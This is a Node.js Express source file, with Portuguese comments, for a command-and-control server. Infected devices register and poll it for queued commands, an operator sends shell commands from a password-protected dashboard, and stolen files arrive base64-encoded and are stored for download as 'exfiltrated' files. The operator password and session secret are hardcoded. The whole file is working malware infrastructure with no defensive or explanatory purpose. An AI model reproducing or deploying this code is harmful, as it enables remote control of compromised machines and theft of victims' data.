const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const fs = require('fs-extra');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 9191;
const UPLOADS_DIR = path.join(__dirname, 'uploads');
const DATA_FILE = path.join(__dirname, 'devices.json');

// --- CONFIGURAÇÕES DE SEGURANÇA E SESSÃO ---
const C2_PASSWORD = 'akarui869'; // Senha do Operador

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

app.use(session({
    secret: 'skynet_secret_key_2026_k4n3co',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false, httpOnly: true, maxAge: 24 * 60 * 60 * 1000 }
}));

// --- BANCO DE DADOS EM MEMÓRIA ---
let devices = new Map();
let commandQueues = new Map();
let pendingResponses = new Map();
let longPollWaiters = new Map();
let exfiltratedFiles = [];
let lastActiveDeviceId = null;

// Carregar dados ao iniciar
async function loadData() {
    try {
        if (await fs.pathExists(DATA_FILE)) {
            const data = await fs.readJson(DATA_FILE);
            devices = new Map(Object.entries(data.devices || {}));
            exfiltratedFiles = data.exfiltratedFiles || [];
            console.log(`[SYSTEM] Data loaded. ${devices.size} devices registered.`);
        }
    } catch (e) { console.error('[ERROR] Load data failed:', e); }
}

async function saveData() {
    try {
        const data = {
            devices: Object.fromEntries(devices),
            exfiltratedFiles: exfiltratedFiles
        };
        await fs.writeJson(DATA_FILE, data);
    } catch (e) { console.error('[ERROR] Save data failed:', e); }
}

// --- MIDDLEWARES DE PROTEÇÃO ---
function checkAuth(req, res, next) {
    if (req.session && req.session.authenticated) {
        return next();
    }
    res.redirect('/login');
}

// Middleware para servir arquivos de exfiltração com autenticação
app.use('/c2/downloads', checkAuth, express.static(UPLOADS_DIR));

// --- UTILITÁRIOS ---
function formatFileSize(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}
// --- ROTAS DE AUTENTICAÇÃO ---

app.get('/login', (req, res) => {
    res.send('<h1>Login C2</h1><form method="POST" action="/login"><input type="password" name="password"><button>Entrar</button></form>');
});

app.post('/login', (req, res) => {
    const { password } = req.body;
    if (password === C2_PASSWORD) {
        req.session.authenticated = true;
        return res.redirect('/dashboard');
    }
    res.status(401).send('Senha incorreta');
});

// --- DASHBOARD DO OPERADOR ---

app.get('/dashboard', checkAuth, async (req, res) => {
    const deviceList = Array.from(devices.values()).map(d => `<li>${d.id} - ${d.os} (${d.ip}) <button onclick="sendCommand('${d.id}')">Comandar</button></li>`).join('');
    res.send(`
        <h1>C2 Dashboard</h1>
        <ul>${deviceList}</ul>
        <script>
            async function sendCommand(id) {
                const cmd = prompt('Comando:');
                if(cmd) await fetch('/api/command', { 
                    method: 'POST', 
                    headers: {'Content-Type': 'application/json'}, 
                    body: JSON.stringify({ deviceId: id, command: cmd }) 
                });
                location.reload();
            }
        </script>
    `);
});

// --- API PARA OS DISPOSITIVOS (BOTS) ---

// Registro e Polling de Comandos
app.post('/api/poll', async (req, res) => {
    const { deviceId, info } = req.body;
    
    if (info) {
        devices.set(deviceId, { ...info, lastSeen: Date.now() });
        await saveData();
    }

    const queue = commandQueues.get(deviceId) || [];
    if (queue.length > 0) {
        const cmd = queue.shift();
        commandQueues.set(deviceId, queue);
        return res.json({ command: cmd });
    }

    res.json({ command: null });
});

// Envio de Respostas e Exfiltração
app.post('/api/response', async (req, res) => {
    const { deviceId, response, fileName, fileData } = req.body;
    
    if (fileName && fileData) {
        const filePath = path.join(UPLOADS_DIR, `${deviceId}_${fileName}`);
        await fs.outputFile(filePath, Buffer.from(fileData, 'base64'));
        exfiltratedFiles.push({ deviceId, fileName, path: filePath, date: new Date() });
        await saveData();
    }

    pendingResponses.set(deviceId, response);
    res.sendStatus(200);
});

// API para o Operador enviar comandos
app.post('/api/command', checkAuth, (req, res) => {
    const { deviceId, command } = req.body;
    if (!commandQueues.has(deviceId)) commandQueues.set(deviceId, []);
    commandQueues.get(deviceId).push(command);
    res.json({ status: 'queued' });
});

// Garantir que a pasta de uploads existe
fs.ensureDirSync(UPLOADS_DIR);

loadData().then(() => {
    app.listen(PORT, () => {
        console.log(`[SYSTEM] C2 Server running on port ${PORT}`);
    });
});
